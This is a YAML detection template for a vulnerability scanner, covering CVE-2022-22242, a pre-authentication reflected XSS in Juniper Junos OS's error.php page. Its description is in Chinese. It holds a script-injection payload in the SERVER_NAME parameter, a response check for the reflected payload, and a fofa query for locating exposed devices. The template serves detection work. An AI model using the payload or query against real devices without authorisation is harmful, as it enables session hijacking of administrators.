id: CVE-2022-22242

info:
  name: Juniper Networks Junos OS错误页面反射XSS漏洞CVE-2022-22242
  author: daffainfo
  severity: medium
  verified: true
  description: |
    CVE-2022-22242它是位于出错页面 (“error.php”) 上的预认证反射型XSS漏洞，可导致远程攻击者嗅探 Junos OS 管理员会话并与其它要求认证的缺陷组合利用。
    fofa-query: icon_hash="1167011145"
  reference:
    - https://www.linuxlz.com/aqld/3200.html

rules:
    r0:
        request:
            method: GET
            path: /error.php?SERVER_NAME=<script>alert(0)</script>
        expression: response.body.bcontains(b"<script>alert(0)")
expression: r0()